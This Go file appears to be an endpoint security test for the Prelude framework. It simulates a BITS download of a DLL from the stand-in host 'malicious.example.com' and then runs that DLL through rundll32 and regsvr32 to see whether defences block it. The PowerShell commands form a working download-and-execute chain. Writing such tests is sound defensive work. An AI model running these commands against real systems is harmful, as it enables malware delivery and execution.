//go:build windows
// +build windows

/*
ID: 74c1fd79-5961-4f1d-8ff8-b810b7c88545
NAME: RunDLL32/Regsvr32 Loads a DLL Downloaded via BITS
CREATED: 2024-07-01
*/
package main

import (
	"fmt"
	"os/exec"
	"strings"
	"time"

	Endpoint "github.com/preludeorg/test/endpoint"
)

func main() {
	Endpoint.Say("[+] Starting RunDLL32/Regsvr32 Loads a DLL Downloaded via BITS VST")
	Endpoint.Start(test, cleanup)
}

func test() {
	executeCommand := func(command string) {
		if !Endpoint.IsAvailable("powershell.exe") {
			Endpoint.Say("[+] Command execution is not available")
			Endpoint.Stop(126) // PROTECTED: Access Denied
		}

		out, err := exec.Command("powershell.exe", "-Command", command).CombinedOutput()
		if err != nil {
			Endpoint.Say(fmt.Sprintf("[-] Failed to execute command: %s", string(out)))
			Endpoint.Stop(1) // ERROR
		}

		Endpoint.Say(fmt.Sprintf("[+] Successfully executed command: %s", command))

		if strings.Contains(string(out), "Access Denied") {
			Endpoint.Say("[+] Process execution was blocked")
			Endpoint.Stop(126) // PROTECTED: Access Denied
		}
	}

	// Step 1: Download a DLL via BITS
	bitsDownloadCommand := "Start-BitsTransfer -Source 'http://malicious.example.com/malicious.dll' -Destination 'C:\\Users\\Public\\BIT1.tmp'"
	Endpoint.Say("[+] Downloading DLL via BITS")
	executeCommand(bitsDownloadCommand)

	time.Sleep(3 * time.Second) // Wait for download to complete

	// Step 2: Rename the downloaded DLL
	renameCommand := "Rename-Item -Path 'C:\\Users\\Public\\BIT1.tmp' -NewName 'C:\\Users\\Public\\malicious.dll'"
	Endpoint.Say("[+] Renaming downloaded DLL")
	executeCommand(renameCommand)

	time.Sleep(3 * time.Second) // Wait for rename to complete

	// Step 3: Execute the downloaded DLL using rundll32
	rundll32Command := "rundll32.exe C:\\Users\\Public\\malicious.dll,EntryPoint"
	Endpoint.Say("[+] Executing downloaded DLL with rundll32")
	executeCommand(rundll32Command)

	// Step 4: Execute the downloaded DLL using regsvr32
	regsvr32Command := "regsvr32.exe /s C:\\Users\\Public\\malicious.dll"
	Endpoint.Say("[+] Executing downloaded DLL with regsvr32")
	executeCommand(regsvr32Command)

	// Check if DLL was executed successfully
	if Endpoint.Exists("C:\\Users\\Public\\malicious.dll") {
		Endpoint.Say("[-] DLL was not blocked")
		Endpoint.Stop(101) // UNPROTECTED
	} else {
		Endpoint.Say("[+] DLL was blocked")
		Endpoint.Stop(105) // PROTECTED
	}
}

func cleanup() {
	Endpoint.Say("[+] Cleaning up test artifacts")
	_ = Endpoint.Remove("C:\\Users\\Public\\BIT1.tmp")
	_ = Endpoint.Remove("C:\\Users\\Public\\malicious.dll")
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}
